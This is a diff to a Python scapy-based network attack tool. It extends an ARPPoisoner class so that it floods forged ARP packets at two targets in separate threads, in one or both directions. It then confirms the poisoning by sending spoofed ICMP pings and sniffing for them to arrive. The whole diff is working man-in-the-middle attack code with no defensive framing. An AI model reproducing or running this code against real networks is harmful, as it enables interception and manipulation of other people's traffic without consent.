@@ -6,6 +6,7 @@ from threading import Thread
 import time
 from collections import deque
 from requests import post
+from time import sleep
 
 
 class AttackTools:
@@ -36,15 +37,21 @@ class AttackTools:
                 sendp(arp2, verbose=False)
 
         if flood:
-            poisoners = [ARPPoisoner(arp1)]
-            poisoners[0].poison()
+            poisoners = [ARPPoisoner(arp1, target1, target2)]
+            thread1 = Thread(target=poisoners[0].poison)
+            thread1.start()
 
         if flood and bidirectional:
-            poisoners.append(ARPPoisoner(arp2))
-            poisoners[1].poison()
+            poisoners.append(ARPPoisoner(arp2, target2, target1))
+            thread2 = Thread(target=poisoners[1].poison)
+            thread2.start()
 
         if flood:
-            return poisoners
+            print("Poisoning targets...")
+            thread1.join()
+            thread2.join()
+            print()
+            print("Poisoning succeeded")
 
     @staticmethod
     def sniff(must_send: bool, interface: Interface, destination: Destination = None):
@@ -54,26 +61,57 @@ class AttackTools:
 
 
 class ARPPoisoner:
-    def __init__(self, pkt):
-        self.thread = threading.Thread
+    def __init__(self, pkt, victim: Host, host: Host):
+        self.flood_thread = Thread
+        self.ping_send_thread = Thread
+        self.ping_listen_thread = Thread
+        self.confirm_thread = Thread
         self.killed = False
         self.pkt = pkt
+        self.host = host
+        self.victim = victim
+        self.success = False
 
     def poison(self):
-        self.thread = Thread(target=self.sendp_flood, args=(self.pkt,))
-        self.thread.start()
+        self.flood_thread = Thread(target=self.sendp_flood, args=(self.pkt,))
+        self.flood_thread.start()
+        self.confirm_thread = Thread(target=self.confirm_poison)
+        self.confirm_thread.start()
+        self.flood_thread.join()
+        self.confirm_thread.join()
 
     def kill(self):
         self.killed = True
 
     def get_thread(self):
-        return self.thread
+        return self.flood_thread
 
     def sendp_flood(self, pkt):
-        while True:
+        while not self.killed:
             sendp(pkt, verbose=False)
-            if self.killed:
-                break
+
+    def confirm_poison(self):
+        self.ping_listen_thread = Thread(target=self.listen_ping)
+        self.ping_listen_thread.start()
+        self.ping_send_thread = Thread(target=self.send_ping)
+        self.ping_send_thread.start()
+
+        self.ping_listen_thread.join()
+        self.ping_send_thread.join()
+
+    def listen_ping(self):
+        filt = "icmp and dst host " + self.victim.get_addr()
+        sniff(count=1, filter=filt)
+        print("Successfully poisoned " + self.victim.get_addr())
+        self.success = True
+
+    def send_ping(self):
+        pkt = scapy.layers.inet.IP(dst=self.victim.get_addr(), src=self.host.get_addr())/scapy.layers.inet.ICMP()
+        while not self.success:
+            send(pkt, verbose=False)
+            sleep(1)
+
+        self.kill()
 
 
 class Sniffer:
